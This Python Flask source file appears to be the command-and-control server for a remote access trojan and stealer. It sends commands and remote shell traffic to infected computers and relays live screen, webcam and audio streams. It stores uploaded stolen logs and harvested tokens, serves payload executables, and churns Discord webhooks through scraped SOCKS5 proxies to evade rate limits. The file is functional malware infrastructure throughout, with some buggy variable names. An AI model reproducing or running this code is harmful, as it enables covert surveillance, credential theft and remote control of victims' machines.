import multiprocessing, threading, requests, hashlib, urllib3, zipfile, random, flask, json, time, os

while True:
    try:
        from flask import Flask, request, send_file, jsonify
        from flask_sock import Sock

        break
    except:
        os.system("pip install flask-sock")

screen_recv_ws = {}
camera_recv_ws = {}
audio_recv_ws = {}

app = Flask(__name__)
sock = Sock(app)
command = {}

shell_commands = {}
shell_response = {}

proxies = requests.get(
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&anonymity=elite&simplified=true"
).text.splitlines()

proxies = ["socks5://" + proxy for proxy in proxies]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
key = os.environ["key"]
connectedComputers = []


channel_id = 12345678901234567890
channel_id2 = 12345678901234567890


headers = {
    "content-Type": "application/json",
    "user-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "authorization": os.environ["token"],
}


def proxyswap():
    global proxies
    while True:
        dproxies = requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&country=US&anonymity=elite&simplified=true"
        ).text.splitlines()
        proxies += ["socks5://" + proxy for proxy in dproxies]
        time.sleep(60)


def refreshproxies():
    global proxies
    dproxies = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&country=US&anonymity=elite&simplified=true"
    ).text.splitlines()
    proxies += ["socks5://" + proxy for proxy in dproxies]
    time.sleep(60)


def clear(webhooks):
    time.sleep(30)
    print("Deleting webhooks")
    for webhook in webhooks:
        webhook = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
        requests.delete(webhook, headers=headers, verify=False)
    print("Deleted all webhooks successfully")
    for _ in range(10):
        while True:
            try:
                proxy = random.choice(proxies)
                create_webhook(channel_id, proxy, timeout=60)
                break
            except:
                pass


def log_webhook_creation(webhook, ip):
    requests.post(
        os.environ["webhook_generation_logs"],
        data={"content": f"{ip} has generated a new webhook {webhook}"},
    )


def create_webhook(channel, proxy, timeout=10):
    if proxy:
        response = requests.post(
            f"https://discord.com/api/v9/channels/{channel}/webhooks",
            json={"name": "Captain Hook"},
            headers=headers,
            proxies={"httpss": proxy},
            verify=False,
            timeout=timeout,
        ).json()

    else:
        response = requests.post(
            f"https://discord.com/api/v9/channels/{channel}/webhooks",
            json={"name": "Captain Hook"},
            headers=headers,
            proxies={"httpss": proxy},
            verify=False,
            timeout=timeout,
        ).json()

    return response


def get_webhooks(channel, proxy):
    try:
        return requests.get(
            f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
        ).json()
    except:
        return None


def get_webhook():
    response = {"code": 30007}
    while True:
        try:
            proxy = random.choice(proxies)
            response = create_webhook(channel_id, proxy)
            break
        except Exception as e:
            print(e)
            if "Expecting" in str(e):
                return os.environ["backup_webhook"]
            try:
                proxies.remove(proxy)
            except:
                break

    if "code" in list(response):
        if response["code"] == 30007:
            webhooks = get_webhooks(channel, proxy)
            webhook = random.choice(webhooks)
            threading.Thread(target=clear, args=(webhooks,)).start()
            return (
                f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
            )

        elif response["code"] == 20029:
            print("Ratelimited. Attempting to use old webhook")
            try:
                webhooks = get_webhooks(channel_id2, proxy)
                webhook = random.choice(webhooks)
                return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
            except:

                print("No already existing webhooks, switching to seperate server")
                webhooks = get_webhooks(channel_id2, proxy)

                ratelimit = response["retry_after"]
                response = create_webhook(channel_id2, proxy)
                ratelimit = min(ratelimit, response["retry_after"])

                if not "id" in list(response):
                    time.sleep(ratelimit + 1)
                    print(
                        f"Can't generate webhook in new server, waiting ratelimit instead {response['retry_after']}"
                    )

            threading.Thread(target=clear, args=(webhooks,)).start()
            print(webhook)
            return (
                f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
            )

    print(f"https://discord.com/api/webhooks/{response['id']}/{response['token']}")
    return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"


def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(
                os.path.join(root, file),
                os.path.relpath(os.path.join(root, file), os.path.join(path, "..")),
            )


def ping(ws, computer):
    global connectedComputers
    tries = 5
    while True:
        time.sleep(1)
        try:
            tries -= 1
            ws.send("ping")
        except:
            if tries < 0:
                try:
                    connectedComputers.remove(computer)
                except:
                    pass
                try:
                    ws.close()
                except:
                    pass
                print("Bye!")
                break


@sock.route("/api/ws/commands")
def commands(ws):
    global connectedComputers
    global command

    print("User Connected")
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    
    if not encoded == key:
        print("Client provided invalid key")
        ws.close()

    while True:
        computer = ws.receive()
        if not "|" in computer:
            ws.send("getComputer")
        else:
            break

    print(computer)
    connectedComputers.append(computer)
    threading.Thread(target=ping, args=(ws, computer)).start()

    while True:

        if not command:
            continue

        if computer == command["target"]:
            if not computer in connectedComputers:
                connectedComputers.append(computer)

            ws.send(command["code"])
            command = {}


@sock.route("/api/ws/camera")
def wscamera(ws):
    global camera_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if computer not in camera_recv_ws:
        camera_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for ws in camera_rcv_ws[computer]:
            try:
                ws.send(image)
            except:
                camera_rcv_ws[computer].remove(ws)


@sock.route("/api/ws/screen")
def wsscreen(ws):
    global screen_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if computer not in screen_recv_ws:
        screen_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for ws in screen_rcv_ws[computer]:
            try:
                ws.send(image)
            except:
                screen_rcv_ws[computer].remove(ws)


@sock.route("/api/ws/audio")
def wsaudio(ws):
    global audio_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()
        
    computer = ws.receive()

    if computer not in audio_recv_ws:
        audio_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for ws in audio_rcv_ws[computer]:
            try:
                ws.send(image)
            except:
                audio_rcv_ws[computer].remove(ws)

@sock.route("/api/ws/showCamera")
def camera(ws):
    global camera_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if computer not in camera_recv_ws:
        camera_recv_ws[computer] = []

    camera_recv_ws[computer].append(ws)
        
@sock.route("/api/ws/showScreen")
def screen(ws):
    global screen_recv_ws
    data = ws.receive()

    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if computer not in screen_recv_ws:
        screen_recv_ws[computer] = []

    screen_recv_ws[computer].append(ws)


@sock.route("/api/ws/playAudio")
def audio(ws):
    global audio_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if computer not in audio_recv_ws:
        audio_recv_ws[computer] = []

    audio_recv_ws[computer].append(ws)

def update(ws):
    global connectedComputers
    old = None
    while True:
        if not old == connectedComputers:
            old = connectedComputers[:]
        else:
            continue

        newComputers = {"computers": connectedComputers}
        if len(newComputers["computers"]) > 1:
            newComputers["computers"] = list(set(connectedComputers))
        ws.send(newComputers)


@sock.route("/api/ws/computers")
def computers(ws):
    global connectedComputers
    global command
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print(encoded)
    if not encoded == key:
        ws.close()

    threading.Thread(target=update, args=(ws,)).start()
    while True:

        command = json.loads(ws.receive())
        print(command)


@sock.route("/api/ws/readShell")
def readshell(ws):
    global shell_response
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print(encoded)
    if not encoded == key:
        ws.close()

    computer = ws.receive()
    threading.Thread(
        target=listen,
        args=(
            ws,
            computer,
        ),
    ).start()
    while True:

        if computer in shell_response and shell_response[computer]:
            print()
            ws.send(shell_response[computer])
            shell_response[computer] = None


def listen(ws, computer):
    global shell_commands
    while True:
        shell_commands[computer] = ws.receive()


def send(ws, computer):
    global shell_commands
    while True:
        if computer in shell_commands and shell_commands[computer]:
            ws.send(shell_commands[computer])
            shell_commands[computer] = None


@sock.route("/api/ws/shell")
def shell(ws):
    global shell_response
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print("SHELL")
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    threading.Thread(
        target=send,
        args=(
            ws,
            computer,
        ),
    ).start()
    while True:
        shell_response[computer] = ws.receive()


@app.route("/webhook", methods=["POST", "GET"])
def webhook():
    try:
        request.form["key"]
    except:
        return "", 404
    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404

    @flask.after_this_request
    def process_after_request(response):
        @response.call_on_close
        def process_after_request():
            print("Waiting 60 seconds before deletion")
            time.sleep(60)
            requests.delete(hook, headers=headers)
            print(f"Deleted {hook}")

        return response

    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]

    try:
        webhook = get_webhook()
        log_webhook_creation(hook, ip)
    except:
        hook = os.environ["backup_webhook"]

    return webhook


@app.route("/logs", methods=["POST", "GET"])
def logs():
    try:
        request.form["key"]
    except:
        print("Client provided invalid key")
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        print("Client provided invalid key")
        return "", 404

    if request.method == "POST":
        log = request.files["file"]
        user = request.form["user"]
        ip = request.form["ip"]

        try:
            dir = f"logs/{user}-{ip}"
            log.save(dir)
        except Exception as e:
            print(e)

        return "", 404

    else:
        with zipfile.ZipFile("temp.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
            zipdir("logs/", zipf)

        data = open("temp.zip", "rb").read()

        return data


@app.route("/tokens", methods=["POST", "GET"])
def tokens():
    try:
        request.form["key"]
    except:
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404

    if request.method == "POST":
        keysFile = json.load(open("tokens.json", "rb"))
        token = request.form["token"]

        with open("tokens.json", "w+") as f:
            keys = keysFile["keys"]
            keys.append(token)
            keysFile["keys"] = keys
            json.dump(keysFile, f, indent=1)
            f.close()
        return "", 204

    elif request.method == "GET":
        keysFile = json.load(open("tokens.json", "r"))
        keys = keysFile["keys"]
        return keys


@app.route("/files/log", methods=["GET"])
def logger():
    return send_file("logger.exe", as_attachment=True, download_name="lg.exe")


@app.route("/files/main", methods=["GET"])
def controller():
    return send_file("output.exe", as_attachment=True)


@app.errorhandler(404)
def page_not_found(e):
    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]
    print(ip)
    return "", 404


@app.errorhandler(500)
def error(e):
    return "", 404


@app.errorhandler(405)
def notallowed(e):
    return "", 404


@app.errorhandler(400)
def notallowed(e):
    return "", 404


if __name__ == "__main__":
    # Run the Flask app
    threading.Thread(target=proxyswap).start()
    app.run(host="0.0.0.0", debug=True, port=8080)
